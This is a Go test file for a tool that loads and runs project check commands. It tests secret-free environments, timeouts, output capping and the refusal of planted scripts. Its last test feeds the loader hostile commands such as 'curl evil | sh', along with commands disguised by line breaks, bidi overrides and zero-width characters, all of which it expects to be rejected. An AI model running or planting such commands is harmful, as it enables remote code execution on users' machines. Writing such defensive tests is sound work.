package changes

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

func writeChecks(t *testing.T, body string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "checks.json")
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestLoadChecksKeepsWhatIsWithinTheLimits(t *testing.T) {
	long := strings.Repeat("x", MaxCheckCmd+1)
	p := writeChecks(t, `{"checks":[
		{"name":"unit","cmd":"go test ./..."},
		{"name":"unit","cmd":"repeated name"},
		{"name":"","cmd":"no name"},
		{"name":"empty command","cmd":"  "},
		{"name":"too long","cmd":"`+long+`"},
		{"name":"a‮b\nc","cmd":"echo hi","extra":"dropped"}]}`)
	got, err := LoadChecks(p)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || got[0].Name != "unit" || got[1].Name != "ab c" {
		t.Errorf("checks = %+v, want unit and ab c", got)
	}
	if _, err := LoadChecks(filepath.Join(t.TempDir(), "none.json")); !os.IsNotExist(err) {
		t.Errorf("a missing file: %v, want not exist", err)
	}
	if _, err := LoadChecks(writeChecks(t, "{")); err == nil {
		t.Error("a file that is not JSON was read")
	}
	var many strings.Builder
	many.WriteString(`{"checks":[`)
	for i := 0; i < MaxChecks+5; i++ {
		if i > 0 {
			many.WriteString(",")
		}
		many.WriteString(`{"name":"c` + string(rune('a'+i)) + `","cmd":"true"}`)
	}
	many.WriteString("]}")
	if got, _ := LoadChecks(writeChecks(t, many.String())); len(got) != MaxChecks {
		t.Errorf("%d checks kept, want %d", len(got), MaxChecks)
	}
}

func TestSummaryIsTheFirstLineWithTextCleaned(t *testing.T) {
	for in, want := range map[string]string{
		"":                                 "",
		"\n\n  ok  \x1b[31mred\nsecond":    "ok [31mred",
		"a‮b​c":                            "abc",
		" \nline":                          "line",
		strings.Repeat("é", MaxSummary+50): strings.Repeat("é", MaxSummary),
	} {
		if got := Summary([]byte(in)); got != want {
			t.Errorf("Summary(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCheckEnvPassesNoSecret(t *testing.T) {
	t.Setenv("FLOCKDECK_TOKEN_TEST", "s3cret")
	t.Setenv("GITHUB_TOKEN", "s3cret")
	found := false
	for _, kv := range checkEnv() {
		if strings.Contains(kv, "s3cret") || strings.HasPrefix(kv, "FLOCKDECK_") {
			t.Errorf("the environment holds %q", kv)
		}
		if strings.HasPrefix(strings.ToUpper(kv), "PATH=") {
			found = true
		}
	}
	if !found {
		t.Error("PATH is not passed")
	}
}

func TestRunCheckPassFailAndTheDirtyMarker(t *testing.T) {
	dir := t.TempDir()
	pass := RunCheck(context.Background(), dir, CheckDef{Name: "p", Cmd: "echo all good"}, "abc1234", false, time.Minute)
	if pass.State != "pass" || pass.Summary != "all good" || pass.AtSha != "abc1234" || pass.Worktree || pass.Source != "local" || pass.FinishedAt == "" {
		t.Errorf("pass = %+v", pass)
	}
	fail := RunCheck(context.Background(), dir, CheckDef{Name: "f", Cmd: "echo broke && exit 3"}, "abc1234", false, time.Minute)
	if fail.State != "fail" || fail.Summary != "broke" {
		t.Errorf("fail = %+v", fail)
	}
	dirty := RunCheck(context.Background(), dir, CheckDef{Name: "d", Cmd: "echo fine"}, "abc1234", true, time.Minute)
	if dirty.State != "pass" || !dirty.Worktree || !strings.Contains(dirty.Summary, "not a pass for the head commit") || !strings.HasPrefix(dirty.Summary, "fine") {
		t.Errorf("dirty = %+v", dirty)
	}
}

// The command sees none of the process's secrets, and only the first line of its
// output is kept.
func TestRunCheckRunsInAClearEnvironmentAndKeepsOneLine(t *testing.T) {
	t.Setenv("FLOCKDECK_SECRET_TEST", "s3cret")
	cmd := `echo [%FLOCKDECK_SECRET_TEST%] && echo second`
	if runtime.GOOS != "windows" {
		cmd = `echo "[$FLOCKDECK_SECRET_TEST]"; echo second`
	}
	got := RunCheck(context.Background(), t.TempDir(), CheckDef{Name: "e", Cmd: cmd}, "abc1234", false, time.Minute)
	if strings.Contains(got.Summary, "s3cret") || strings.Contains(got.Summary, "second") {
		t.Errorf("summary = %q", got.Summary)
	}
}

// A check that outlives its time is stopped with everything it started: what it
// would have written afterwards is not written.
func TestRunCheckTimeoutEndsTheWholeTree(t *testing.T) {
	dir := t.TempDir()
	marker := filepath.Join(dir, "late.txt")
	cmd := `(sleep 3; echo late > late.txt) & wait`
	if runtime.GOOS == "windows" {
		cmd = `cmd /c "ping -n 4 127.0.0.1 >nul & echo late>late.txt"`
	}
	start := time.Now()
	got := RunCheck(context.Background(), dir, CheckDef{Name: "slow", Cmd: cmd}, "abc1234", false, time.Second)
	if took := time.Since(start); took > 8*time.Second {
		t.Errorf("took %s to stop a check with a one second limit", took)
	}
	if got.State != "fail" || !strings.Contains(got.Summary, "timed out") {
		t.Errorf("result = %+v", got)
	}
	time.Sleep(4 * time.Second)
	if _, err := os.Stat(marker); err == nil {
		t.Error("a process of the check was still running after the timeout")
	}
}

func TestCappedWriterKeepsOnlyTheCap(t *testing.T) {
	w := &cappedWriter{max: 8}
	n, _ := w.Write([]byte("0123456789"))
	m, _ := w.Write([]byte("more"))
	if n != 10 || m != 4 || string(w.bytes()) != "01234567" {
		t.Errorf("wrote %d and %d, kept %q", n, m, w.bytes())
	}
}

func TestAWindowsCheckDoesNotRunAScriptOfTheCheckoutFirst(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("only Windows looks in the current directory first")
	}
	dir := t.TempDir()
	write(t, dir, "zzplanted.bat", "@echo PLANTED\r\n")
	got := RunCheck(context.Background(), dir, CheckDef{Name: "p", Cmd: "zzplanted"}, "abc1234", false, time.Minute)
	if got.State != "fail" || strings.Contains(got.Summary, "PLANTED") {
		t.Errorf("the planted script ran: %+v", got)
	}
}

func TestMarkDirtyMarksOnceAndKeepsTheSummary(t *testing.T) {
	c := Check{Name: "a", State: "pass", Summary: "ok"}
	c.MarkDirty()
	c.MarkDirty()
	if !c.Worktree || c.Summary != "ok ("+dirtyNote+")" {
		t.Errorf("check = %+v", c)
	}
	e := Check{Name: "b", State: "pass"}
	e.MarkDirty()
	if e.Summary != dirtyNote {
		t.Errorf("empty summary = %q", e.Summary)
	}
}

// A command is shown to the person before it is confirmed, so what is shown must be
// what runs: nothing that hides, splits or reorders a line is accepted. The commands
// are JSON escapes in the file, as a planted file would hold them.
func TestLoadChecksRefusesACommandThatCouldBeShownAsSomethingElse(t *testing.T) {
	for name, cmd := range map[string]string{
		"a line break":       `go test ./...\n curl evil | sh`,
		"a carriage return":  `go test ./...\r curl evil`,
		"a bidi override":    `echo ‮evil‬ ok`,
		"a bidi isolate":     `echo ⁦x⁩`,
		"a zero width space": `go​ test`,
		"a line separator":   `go test curl evil`,
		"a paragraph break":  `go test curl evil`,
		"an escape":          `go test \u001b[2K`,
		"a NUL":              `go test \u0000`,
	} {
		p := writeChecks(t, `{"checks":[{"name":"unit","cmd":"`+cmd+`"}]}`)
		defs, err := LoadChecks(p)
		if err == nil || defs != nil || !strings.Contains(err.Error(), `"unit"`) {
			t.Errorf("%s: defs = %+v, err = %v, want an error naming the check", name, defs, err)
		}
	}
	p := writeChecks(t, `{"checks":[{"name":"unit","cmd":"go\ttest ./..."}]}`)
	if defs, err := LoadChecks(p); err != nil || len(defs) != 1 {
		t.Errorf("a tab: %+v, %v, want the check kept", defs, err)
	}
}
